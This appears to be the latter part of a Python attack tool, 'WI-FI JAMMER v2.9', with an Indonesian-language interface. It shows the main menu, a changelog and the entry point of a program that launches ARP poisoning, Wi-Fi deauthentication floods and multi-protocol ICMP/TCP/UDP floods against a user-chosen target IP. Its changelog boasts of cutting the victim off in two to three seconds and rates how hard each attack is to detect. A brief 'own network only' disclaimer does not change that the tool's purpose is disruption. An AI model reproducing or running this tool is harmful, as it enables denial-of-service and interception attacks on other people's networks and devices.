        print(f"\n{C['C']}{EMO['back']} Creating network backup...{C['RESET']}")
        try:
            with open(self.backup_file, 'w') as f:
                f.write(f"Backup created: {datetime.now()}\n")
                f.write(f"Interface: {self.interface}\n")
                f.write(f"IP: {self.get_my_ip()}\n")
                f.write(f"MAC: {self.get_my_mac()}\n")
                f.write(f"Gateway: {self.gateway_ip}\n")
                f.write(f"Gateway MAC: {self.gateway_mac}\n")
                f.write(f"WiFi SSID: {self.get_wifi_ssid()}\n")
                f.write(f"ARP Table: {json.dumps(self.arp_table, indent=2)}\n")
            print(f"{C['G']}{EMO['check']} Backup saved to: {self.backup_file}{C['RESET']}")
        except Exception as e:
            print(f"{C['R']}Backup failed: {e}{C['RESET']}")
    
    def show_attack_stats(self):
        print(f"\n{C['BOLD']}{C['C']}{'='*70}{C['RESET']}")
        print(f"{C['BOLD']}{C['Y']}{EMO['stats']} ATTACK STATISTICS {EMO['stats']}{C['RESET']}")
        print(f"{C['BOLD']}{C['C']}{'='*70}{C['RESET']}")
        
        print(f"""
{C['BOLD']}📊 OVERALL STATISTICS:{C['RESET']}
  {C['Y']}Total Packets Sent:     {C['R']}{self.total_packets:,}
  {C['Y']}Blocked Devices:        {C['R']}{len(self.blocked_devices)}
  {C['Y']}Total Events Logged:    {C['R']}{len(self.attack_log)}
  {C['Y']}Active Threads:         {C['R']}{threading.active_count()}
  {C['Y']}Version:                {C['R']}v2.9 REBORN EDITION
  {C['Y']}Methods:                {C['R']}25+ METHODS (ARP + DEAUTH + MULTI PROTOCOL)
  {C['Y']}Speed Mode:             {C['R']}LIGHTNING (50,000+ pps max)
""")
        
        print(f"\n{C['BOLD']}⚔️  METHOD BREAKDOWN:{C['RESET']}")
        print(f"  {C['G']}→ LIGHTNING ARP POISONING : 10 threads, 20,000+ pps")
        if os.name != 'nt':
            print(f"  {C['G']}→ ULTRA DEAUTH FLOOD     : 15 threads, 5,000+ pps")
        print(f"  {C['G']}→ MULTI PROTOCOL STORM    : 8 threads, 25,000+ pps")
        
        print(f"\n{C['C']}{'='*70}{C['RESET']}")
    
    def pmkid_attack_menu(self):
        print(f"\n{C['BOLD']}{C['C']}{'='*70}{C['RESET']}")
        print(f"{C['BOLD']}{C['Y']}{EMO['pmkid']} PMKID ATTACK - COMING SOON FEATURE {EMO['pmkid']}{C['RESET']}")
        print(f"{C['BOLD']}{C['C']}{'='*70}{C['RESET']}")
        print(f"{C['Y']}{EMO['info']} PMKID Attack requires Linux with monitor mode support{C['RESET']}")
        input(f"\n{C['Y']}Press Enter...{C['RESET']}")
    
    def deauth_attack_detector(self):
        print(f"\n{C['BOLD']}{C['C']}{'='*70}{C['RESET']}")
        print(f"{C['BOLD']}{C['Y']}{EMO['alert']} DEAUTH ATTACK DETECTOR {EMO['alert']}{C['RESET']}")
        print(f"{C['BOLD']}{C['C']}{'='*70}{C['RESET']}")
        print(f"{C['Y']}{EMO['info']} Deauth detection requires monitor mode (Linux){C['RESET']}")
        input(f"\n{C['Y']}Press Enter...{C['RESET']}")
    
    def wifi_network_scanner(self):
        print(f"\n{C['BOLD']}{C['C']}{'='*70}{C['RESET']}")
        print(f"{C['BOLD']}{C['Y']}{EMO['wifi']} WIFI NETWORK SCANNER {EMO['wifi']}{C['RESET']}")
        print(f"{C['BOLD']}{C['C']}{'='*70}{C['RESET']}")
        print(f"{C['Y']}{EMO['info']} WiFi scanner requires monitor mode (Linux){C['RESET']}")
        input(f"\n{C['Y']}Press Enter...{C['RESET']}")

    # ========== UPDATE INFO & CHANGELOG ==========
    def show_update_info(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        print(f"""
        {C['BOLD']}{C['C']}╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
        {C['BOLD']}{C['C']}║                         📢 UPDATE INFO & CHANGELOG v2.9 - REBORN EDITION 📢                                                               ║
        {C['BOLD']}{C['C']}╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝{C['RESET']}

        {C['BOLD']}{C['G']}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{C['RESET']}
        {C['BOLD']}{C['Y']}                      VERSI SAAT INI: v2.9 "THE ULTIMATE APOCALYPSE REBORN"                                                                     {C['RESET']}
        {C['BOLD']}{C['G']}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{C['RESET']}

        {C['BOLD']}{C['R']}💀 PERINGATAN: 25+ METHOD - LIGHTNING SPEED - PUTUS DALAM 2-3 DETIK! 💀{C['RESET']}

        {C['BOLD']}{C['M']}══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{C['RESET']}
        {C['BOLD']}{C['M']}              🔥 APA YANG BARU DI v2.9 - REBORN EDITION 🔥{C['RESET']}
        {C['BOLD']}{C['M']}══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{C['RESET']}

        {C['G']}✅ GABUNGAN KEKUATAN 1.0 + 2.1 + 2.5:{C['RESET']}
           ├─ Kecepatan blocking dari v1.0 (20,000+ pps)
           ├─ Vendor database dari v2.1 (99% akurasi)
           ├─ Multi protocol attack dari v2.5
           └─ Hasil: PUTUS DALAM 2-3 DETIK!

        {C['G']}✅ LIGHTNING ARP POISONING (DARI V1.0 - DITINGKATKAN):{C['RESET']}
           ├─ 10 threads concurrent
           ├─ Packet burst: 200 per cycle
           ├─ Delay minimal: 0.0001 detik
           ├─ Rate: 20,000+ packet per detik
           └─ Efek: TARGET LANGSUNG DISCONNECT!

        {C['G']}✅ ULTRA DEAUTH FLOOD (DARI V2.5 - DITINGKATKAN):{C['RESET']}
           ├─ 15 threads concurrent
           ├─ 20 reason codes
           ├─ Spoofed BSSID rotation
           ├─ Rate: 5,000+ packet per detik
           └─ Efek: TARGET TERTENDANG TERUS-MENERUS

        {C['G']}✅ MULTI PROTOCOL STORM (GABUNGAN TERBARU):{C['RESET']}
           ├─ ICMP Flood (Ping of Death - 12 ukuran)
           ├─ TCP Flood (SYN + RST + FIN ke 15 port)
           ├─ UDP Flood (DNS, NTP, SNMP ke 12 port)
           ├─ ARP Poisoning (Lightning mode)
           ├─ Ghost Connection (250+ fake IP)
           ├─ Rate: 25,000+ packet per detik
           └─ Efek: CPU TARGET 100%, LAG PARAH, DISCONNECT TOTAL!

        {C['G']}✅ UI RENOVASI TOTAL:{C['RESET']}
           ├─ Banner hacker baru dengan ASCII art
           ├─ Warna lebih keren (merah + hijau + cyan)
           ├─ Progress bar lebih informatif
           ├─ Spinner animation
           ├─ Live packet rate display
           └─ Report lengkap setelah attack

        {C['BOLD']}{C['M']}══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{C['RESET']}
        {C['BOLD']}{C['M']}              📋 PENJELASAN PER METODE + RATING EFEK (⭐ 1-5) 📋{C['RESET']}
        {C['BOLD']}{C['M']}══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{C['RESET']}

        {C['BOLD']}{C['Y']}╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
        ║  {C['W']}METHOD 1-10: LIGHTNING ARP POISONING {C['Y']}                                                                              ║
        ╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝{C['RESET']}

        {C['C']}  📝 PENJELASAN:{C['RESET']}
           Mengirim ARP reply palsu ke target dan gateway secara masif. Target akan
           mengira attacker adalah gateway, sehingga semua data dikirim ke attacker.
           Akibatnya target kehilangan koneksi internet total.

        {C['C']}  🎯 EFEK PADA TARGET:{C['RESET']}
           ├─ ⭐⭐⭐⭐⭐ Koneksi Internet: PUTUS TOTAL (Rating: 5/5)
           ├─ ⭐⭐⭐⭐ CPU Target: Naik 40-60% (Rating: 4/5)
           ├─ ⭐⭐⭐⭐⭐ Waktu Putus: 2-3 DETIK (Rating: 5/5)
           ├─ ⭐⭐⭐⭐ Kemungkinan Deteksi: Sulit (Rating: 4/5)
           └─ ⭐⭐⭐⭐ Kesulitan Pulih: Harus restart router (Rating: 4/5)

        {C['C']}  💻 EFEK PADA ATTACKER:{C['RESET']}
           ├─ ⭐⭐⭐ CPU Laptop: Naik 20-30% (Rating: 3/5)
           ├─ ⭐⭐⭐⭐ RAM Usage: 200-300 MB (Rating: 4/5)
           ├─ ⭐⭐⭐ Network Usage: 10,000+ pps (Rating: 3/5)
           └─ ⭐⭐⭐⭐ Resiko Tertangkap: Tinggi (Rating: 4/5)

        {C['BOLD']}{C['Y']}╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
        ║  {C['W']}METHOD 11-25: ULTRA DEAUTH FLOOD {C['Y']}                                                                                ║
        ╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝{C['RESET']}

        {C['C']}  📝 PENJELASAN:{C['RESET']}
           Mengirim packet deauthentication ke target WiFi. Packet ini memberitahu
           target untuk disconnect dari access point. Efeknya target akan terus
           terlempar dari WiFi.

        {C['C']}  🎯 EFEK PADA TARGET:{C['RESET']}
           ├─ ⭐⭐⭐⭐⭐ WiFi: TERTENDANG TERUS (Rating: 5/5)
           ├─ ⭐⭐ CPU Target: Normal (Rating: 2/5)
           ├─ ⭐⭐⭐⭐⭐ Waktu Putus: INSTAN (Rating: 5/5)
           ├─ ⭐⭐⭐ Kemungkinan Deteksi: Bisa dideteksi (Rating: 3/5)
           └─ ⭐⭐⭐⭐ Kesulitan Pulih: Reconnect manual (Rating: 4/5)

        {C['C']}  💻 EFEK PADA ATTACKER:{C['RESET']}
           ├─ ⭐⭐ CPU Laptop: Naik 10-15% (Rating: 2/5)
           ├─ ⭐⭐ RAM Usage: 100-150 MB (Rating: 2/5)
           ├─ ⭐⭐ Network Usage: 5,000+ pps (Rating: 2/5)
           └─ ⭐⭐⭐ Resiko Tertangkap: Sedang (Rating: 3/5)

        {C['BOLD']}{C['Y']}╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
        ║  {C['W']}METHOD 26+: MULTI PROTOCOL STORM (PALING BERBAHAYA!) {C['Y']}                                                           ║
        ╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝{C['RESET']}

        {C['C']}  📝 PENJELASAN:{C['RESET']}
           Menggabungkan 4 protokol sekaligus (ICMP + TCP + UDP + ARP) dalam 1 attack.
           Ini adalah method PALING BERBAHAYA karena menyerang dari berbagai sisi.
           Target akan mengalami LAG TOTAL, DISCONNECT, dan CPU OVERLOAD.

        {C['C']}  🎯 EFEK PADA TARGET:{C['RESET']}
           ├─ ⭐⭐⭐⭐⭐ Koneksi Internet: DISCONNECT TOTAL (Rating: 5/5)
           ├─ ⭐⭐⭐⭐⭐ CPU Target: NAIK 80-100% (Rating: 5/5)
           ├─ ⭐⭐⭐⭐⭐ Waktu Putus: 1-2 DETIK (Rating: 5/5)
           ├─ ⭐⭐ Kemungkinan Deteksi: Sulit (Rating: 2/5)
           └─ ⭐⭐⭐⭐⭐ Kesulitan Pulih: Harus restart (Rating: 5/5)

        {C['C']}  💻 EFEK PADA ATTACKER:{C['RESET']}
           ├─ ⭐⭐⭐⭐ CPU Laptop: Naik 40-50% (Rating: 4/5)
           ├─ ⭐⭐⭐⭐⭐ RAM Usage: 400-500 MB (Rating: 5/5)
           ├─ ⭐⭐⭐⭐ Network Usage: 25,000+ pps (Rating: 4/5)
           └─ ⭐⭐⭐⭐⭐ Resiko Tertangkap: Sangat Tinggi (Rating: 5/5)

        {C['BOLD']}{C['M']}══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{C['RESET']}
        {C['BOLD']}{C['M']}              📊 RINGKASAN RATING EFEK KESELURUHAN {C['RESET']}
        {C['BOLD']}{C['M']}══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{C['RESET']}

        {C['Y']}┌─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐
        │  {C['W']}JENIS EFEK                 {C['Y']}│  {C['W']}ARP Poisoning  {C['Y']}│  {C['W']}Deauth Flood  {C['Y']}│  {C['W']}Multi Storm  {C['Y']}│
        ├─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┤
        │  {C['C']}Kecepatan Putus           {C['Y']}│  {C['G']}⭐⭐⭐⭐⭐ (2-3s)  {C['Y']}│  {C['G']}⭐⭐⭐⭐⭐ (1s)   {C['Y']}│  {C['G']}⭐⭐⭐⭐⭐ (1-2s) {C['Y']}│
        │  {C['C']}CPU Target Naik          {C['Y']}│  {C['Y']}⭐⭐⭐⭐ (40-60%) {C['Y']}│  {C['Y']}⭐⭐ (10%)     {C['Y']}│  {C['R']}⭐⭐⭐⭐⭐ (80-100%){C['Y']}│
        │  {C['C']}Koneksi Internet        {C['Y']}│  {C['R']}⭐⭐⭐⭐⭐ PUTUS  {C['Y']}│  {C['R']}⭐⭐⭐⭐⭐ PUTUS  {C['Y']}│  {C['R']}⭐⭐⭐⭐⭐ PUTUS  {C['Y']}│
        │  {C['C']}CPU Attacker Naik       {C['Y']}│  {C['Y']}⭐⭐⭐ (20-30%) {C['Y']}│  {C['G']}⭐⭐ (10-15%)  {C['Y']}│  {C['R']}⭐⭐⭐⭐ (40-50%){C['Y']}│
        │  {C['C']}RAM Usage Attacker      {C['Y']}│  {C['Y']}⭐⭐⭐⭐ (300MB) {C['Y']}│  {C['G']}⭐⭐ (150MB)  {C['Y']}│  {C['R']}⭐⭐⭐⭐⭐ (500MB){C['Y']}│
        │  {C['C']}Resiko Tertangkap       {C['Y']}│  {C['R']}⭐⭐⭐⭐ (Tinggi){C['Y']}│  {C['Y']}⭐⭐⭐ (Sedang) {C['Y']}│  {C['R']}⭐⭐⭐⭐⭐ (Sangat){C['Y']}│
        └─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘

        {C['BOLD']}{C['M']}══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{C['RESET']}
        {C['BOLD']}{C['M']}              🔮 NEXT UPDATE (v3.0 - "GOD MODE") 🔮{C['RESET']}
        {C['BOLD']}{C['M']}══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{C['RESET']}

        {C['Y']}┌─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐
        │  {C['W']}FITUR                        {C['Y']}│  {C['W']}STATUS          {C['Y']}│  {C['W']}TARGET RILIS                              {C['Y']}│
        ├─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┤
        │  {C['C']}GPU Acceleration (CUDA)      {C['Y']}│  {C['G']}🟢 In Progress   {C['Y']}│  {C['C']}Juni 2026                                 {C['Y']}│
        │  {C['C']}AI Target Detection         {C['Y']}│  {C['G']}🟢 In Progress   {C['Y']}│  {C['C']}Juni 2026                                 {C['Y']}│
        │  {C['C']}Auto Wordlist Generator     {C['Y']}│  {C['G']}🟢 In Progress   {C['Y']}│  {C['C']}Juni 2026                                 {C['Y']}│
        │  {C['C']}WPA3 Support                {C['Y']}│  {C['Y']}🟡 Research      {C['Y']}│  {C['C']}Juli 2026                                 {C['Y']}│
        │  {C['C']}Bluetooth Jamming           {C['Y']}│  {C['Y']}🟡 Planning      {C['Y']}│  {C['C']}Agustus 2026                              {C['Y']}│
        │  {C['C']}Mobile App Control          {C['Y']}│  {C['Y']}🟡 Planning      {C['Y']}│  {C['C']}September 2026                            {C['Y']}│
        │  {C['C']}Web Dashboard Interface     {C['Y']}│  {C['G']}🟢 In Progress   {C['Y']}│  {C['C']}Juni 2026                                 {C['Y']}│
        │  {C['C']}Auto Restore Scheduler      {C['Y']}│  {C['G']}🟢 In Progress   {C['Y']}│  {C['C']}Juni 2026                                 {C['Y']}│
        │  {C['C']}Multi Router Attack         {C['Y']}│  {C['Y']}🟡 Research      {C['Y']}│  {C['C']}Juli 2026                                 {C['Y']}│
        │  {C['C']}Encrypted Payload Mode      {C['Y']}│  {C['G']}🟢 In Progress   {C['Y']}│  {C['C']}Juni 2026                                 {C['Y']}│
        └─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘

        {C['BOLD']}{C['M']}══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{C['RESET']}
        {C['BOLD']}{C['M']}                         📞 DEVELOPER INFO 📞{C['RESET']}
        {C['BOLD']}{C['M']}══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{C['RESET']}

        {C['Y']}  Nama:        {C['G']}Hamzah Wisnu Dzaky (HamzzXPP){C['RESET']}
        {C['Y']}  Versi:       {C['G']}v2.9 - THE ULTIMATE APOCALYPSE REBORN{C['RESET']}
        {C['Y']}  Tanggal:     {C['G']}25 Mei 2026{C['RESET']}
        {C['Y']}  Platform:    {C['G']}Windows / Linux (Cross-platform){C['RESET']}
        {C['Y']}  Metode:      {C['G']}25+ ATTACK METHODS (ARP + DEAUTH + MULTI PROTOCOL){C['RESET']}
        {C['Y']}  Threads:     {C['G']}100+ Concurrent Threads{C['RESET']}
        {C['Y']}  Packet Rate: {C['G']}50,000+ packet/detik (LIGHTNING SPEED!){C['RESET']}
        {C['Y']}  Waktu Putus: {C['G']}2-3 DETIK (PALING CEPAT!){C['RESET']}

        {C['BOLD']}{C['M']}══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{C['RESET']}
        {C['BOLD']}{C['M']}                         ⚠️ PERINGATAN PENTING ⚠️{C['RESET']}
        {C['BOLD']}{C['M']}══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{C['RESET']}

        {C['R']}  ╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
        {C['R']}  ║  🚨  TOOLS INI HANYA UNTUK UJI KEAMANAN JARINGAN SENDIRI! 🚨                                                                     ║
        {C['R']}  ╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝{C['RESET']}
        {C['R']}  • Menggunakan di jaringan orang lain = TINDAKAN KRIMINAL!{C['RESET']}
        {C['R']}  • Ancaman: PENJARA 8 TAHUN + DENDA Rp 10 MILIAR (UU ITE){C['RESET']}
        {C['R']}  • Semua aktivitas dicatat dalam log file{C['RESET']}
        {C['R']}  • Tekan Ctrl+C = Emergency stop (kembalikan semua ke normal){C['RESET']}
        {C['R']}  • LIGHTNING MODE: Bisa bikin CPU attacker naik, gunakan dengan bijak{C['RESET']}

        {C['BOLD']}{C['C']}{'='*70}{C['RESET']}
        """)
        input(f"\n{C['Y']}Tekan Enter untuk kembali ke menu utama...{C['RESET']}")
    # ========== MAIN MENU ==========
    def menu_ultimate(self):
        self.my_ip = self.get_my_ip()
        self.my_mac = self.get_my_mac()
        self.gateway_ip, self.gateway_mac = self.get_gateway()
        
        while True:
            os.system('cls' if os.name == 'nt' else 'clear')
            
            print(f"""
{C['BOLD']}{C['R']}╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
{C['BOLD']}{C['R']}║{C['RESET']}{C['BOLD']}{C['G']}{EMO['matrix']}                                                                                                      {C['RESET']}{C['BOLD']}{C['R']}║
{C['BOLD']}{C['R']}║{C['RESET']}     {C['BOLD']}{C['Y']}{EMO['crown']} WI-FI JAMMER v2.9 - "THE ULTIMATE APOCALYPSE REBORN"     {EMO['apocalypse']}{C['RESET']}                              {C['BOLD']}{C['R']}║
{C['BOLD']}{C['R']}║{C['RESET']}     {C['BOLD']}{C['R']}{EMO['danger']} 25+ METHODS + LIGHTNING SPEED - PUTUS DALAM 2-3 DETIK!   {EMO['death']}{C['RESET']}                                 {C['BOLD']}{C['R']}║
{C['BOLD']}{C['R']}║{C['RESET']}     {C['BOLD']}{C['C']}{EMO['secure']} 🔒 HANYA UNTUK UJI KEAMANAN JARINGAN SENDIRI! 🔒 {EMO['secure']}{C['RESET']}                                   {C['BOLD']}{C['R']}║
{C['BOLD']}{C['R']}║{C['RESET']}                                                                                                                  {C['BOLD']}{C['R']}║
{C['BOLD']}{C['R']}╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝{C['RESET']}

{C['C']}{EMO['net']} INTERFACE: {self.interface:<30} {EMO['device']} YOUR IP: {self.my_ip:<20}
{C['Y']}{EMO['router']} GATEWAY: {str(self.gateway_ip):<30} {EMO['shield']} STATUS: {'🔴 ACTIVE' if self.running else '🟢 IDLE'}
{C['M']}{EMO['wifi']} WiFi SSID: {C['BOLD']}{self.get_wifi_ssid()}{C['RESET']}
{C['R']}{EMO['rocket']} SPEED MODE: {C['BOLD']}LIGHTNING (50,000+ pps){C['RESET']}

{C['BOLD']}{C['R']}{'═'*100}{C['RESET']}
{C['BOLD']}{C['G']}                                         MAIN MENU{C['RESET']}
{C['BOLD']}{C['R']}{'═'*100}{C['RESET']}

{C['BOLD']}{C['Y']}┌────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐{C['RESET']}
{C['BOLD']}{C['Y']}│{C['RESET']}  {C['G']}1.{C['RESET']} {EMO['scan']} ULTIMATE NETWORK SCANNER            {C['G']}7.{C['RESET']} {EMO['database']} VIEW ATTACK LOGS                       {C['BOLD']}{C['Y']}│{C['RESET']}
{C['BOLD']}{C['Y']}│{C['RESET']}  {C['G']}2.{C['RESET']} {EMO['protect']} PRO ARP SPOOFING DETECTOR     {C['G']}8.{C['RESET']} {EMO['info']} SYSTEM INFORMATION                     {C['BOLD']}{C['Y']}│{C['RESET']}
{C['BOLD']}{C['Y']}│{C['RESET']}  {C['R']}3.{C['RESET']} {EMO['apocalypse']} APOCALYPSE REBORN (NEW!)    {C['G']}9.{C['RESET']} {EMO['back']} NETWORK BACKUP                         {C['BOLD']}{C['Y']}│{C['RESET']}
{C['BOLD']}{C['Y']}│{C['RESET']}  {C['G']}4.{C['RESET']} {EMO['pmkid']} PMKID ATTACK (BETA)             {C['G']}10.{C['RESET']}{EMO['stats']} ATTACK STATISTICS                    {C['BOLD']}{C['Y']}│{C['RESET']}
{C['BOLD']}{C['Y']}│{C['RESET']}  {C['G']}5.{C['RESET']} {EMO['alert']} DEAUTH ATTACK DETECTOR         {C['G']}11.{C['RESET']}{EMO['info']} UPDATE INFO & CHANGELOG              {C['BOLD']}{C['Y']}│{C['RESET']}
{C['BOLD']}{C['Y']}│{C['RESET']}  {C['G']}6.{C['RESET']} {EMO['packet']} LIVE PACKET SNIFFER          {C['R']}0.{C['RESET']} {EMO['exit']} EXIT & RESTORE                    {C['BOLD']}{C['Y']}│{C['RESET']}
{C['BOLD']}{C['Y']}└────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘{C['RESET']}

{C['Y']}{EMO['warning']} Developer: HamzzXPP | Version: v2.9 REBORN EDITION | 25+ METHODS + LIGHTNING SPEED
{C['R']}{EMO['death']} ⚠️  LIGHTNING MODE - 100+ THREADS - 50,000+ PACKET/DETIK - PUTUS 2-3 DETIK! ⚠️
{C['C']}{EMO['info']} 📋 Semua aktivitas dicatat di: {self.log_file}

{C['BOLD']}{C['R']}{'═'*100}{C['RESET']}
""")
            
            choice = input(f"{C['BOLD']}{C['Y']}PILIH MENU (0-11): {C['RESET']}")
            
            if choice == '1':
                self.scan_network()
                input(f"\n{C['Y']}Press Enter...{C['RESET']}")
            
            elif choice == '2':
                duration = input(f"{C['B']}Duration (seconds, default 60): {C['RESET']}")
                duration = int(duration) if duration else 60
                self.arp_spoofing_detection(duration)
                input(f"\n{C['Y']}Press Enter...{C['RESET']}")
            
            elif choice == '3':
                devices = self.scan_network()
                if devices:
                    print(f"\n{C['BOLD']}{C['C']}Devices:{C['RESET']}")
                    for i, d in enumerate(devices, 1):
                        print(f"  {i}. {d['ip']} - {d['vendor']}")
                    target = input(f"\n{C['R']}{EMO['apocalypse']} Target IP for APOCALYPSE REBORN: {C['RESET']}")
                    self.block_device_apocalypse(target)
                input(f"\n{C['Y']}Press Enter...{C['RESET']}")
            
            elif choice == '4':
                self.pmkid_attack_menu()
            
            elif choice == '5':
                self.deauth_attack_detector()
            
            elif choice == '6':
                count = input(f"{C['B']}Packets (default 200): {C['RESET']}")
                count = int(count) if count else 200
                self.packet_sniffer_live(count)
                input(f"\n{C['Y']}Press Enter...{C['RESET']}")
            
            elif choice == '7':
                self.show_attack_logs()
                input(f"\n{C['Y']}Press Enter...{C['RESET']}")
            
            elif choice == '8':
                self.show_detailed_system_info()
                input(f"\n{C['Y']}Press Enter...{C['RESET']}")
            
            elif choice == '9':
                self.network_backup()
                input(f"\n{C['Y']}Press Enter...{C['RESET']}")
            
            elif choice == '10':
                self.show_attack_stats()
                input(f"\n{C['Y']}Press Enter...{C['RESET']}")
            
            elif choice == '11':
                self.show_update_info()
            
            elif choice == '0':
                print(f"\n{C['G']}{EMO['check']} Restoring network and saving logs...{C['RESET']}")
                self.restore_network()
                print(f"{C['G']}{EMO['database']} Log saved: {self.log_file}{C['RESET']}")
                print(f"{C['G']}{EMO['check']} Thank you for using WI-FI JAMMER v2.9 REBORN EDITION!{C['RESET']}\n")
                sys.exit(0)
            
            else:
                print(f"{C['R']}Invalid choice!{C['RESET']}")
                time.sleep(1)


# ========== MAIN PROGRAM ==========
def main():
    print(f"\n{C['G']}{EMO['apocalypse']} WI-FI JAMMER v2.9 - THE ULTIMATE APOCALYPSE REBORN {EMO['death']}{C['RESET']}")
    print(f"{C['Y']}Initializing ultimate security modules...{C['RESET']}\n")
    time.sleep(1)
    
    login = LoginSystem()
    if not login.login():
        print(f"{C['R']}Login failed! Exiting...{C['RESET']}")
        sys.exit(1)
    
    if not SCAPY_OK:
        print(f"{C['R']}Scapy not installed! Run: pip install scapy{C['RESET']}")
        sys.exit(1)
    
    tester = UltimateNetworkTester()
    
    print(f"{C['R']}{'='*70}{C['RESET']}")
    print(f"{C['R']}{EMO['death']} ULTIMATE LEGAL DISCLAIMER {EMO['death']}{C['RESET']}")
    print(f"{C['R']}{'='*70}{C['RESET']}")
    print(f"{C['Y']}1. ONLY for testing YOUR OWN network security{C['RESET']}")
    print(f"{C['Y']}2. Unauthorized use = CRIMINAL OFFENSE{C['RESET']}")
    print(f"{C['Y']}3. 25+ METHODS + LIGHTNING SPEED - EXTREMELY DANGEROUS!{C['RESET']}")
    print(f"{C['Y']}4. Penalty: 8 YEARS IMPRISONMENT + $50,000 FINE{C['RESET']}")
    print(f"{C['Y']}5. v2.9 REBORN - PUTUS DALAM 2-3 DETIK!{C['RESET']}")
    print(f"{C['R']}{'='*70}{C['RESET']}")
    
    agree = input(f"\n{C['BOLD']}Do you understand and agree? (type 'I_AGREE'): {C['RESET']}")
    if agree != 'I_AGREE':
        print(f"\n{C['R']}Exiting. Use responsibly!{C['RESET']}")
        sys.exit(0)
    
    try:
        tester.menu_ultimate()
    except KeyboardInterrupt:
        tester.restore_network()
        print(f"\n{C['Y']}{EMO['alert']} Program terminated by user{C['RESET']}")
        sys.exit(0)
    except Exception as e:
        print(f"{C['R']}Error: {e}{C['RESET']}")
        sys.exit(1)

if __name__ == "__main__":
    main()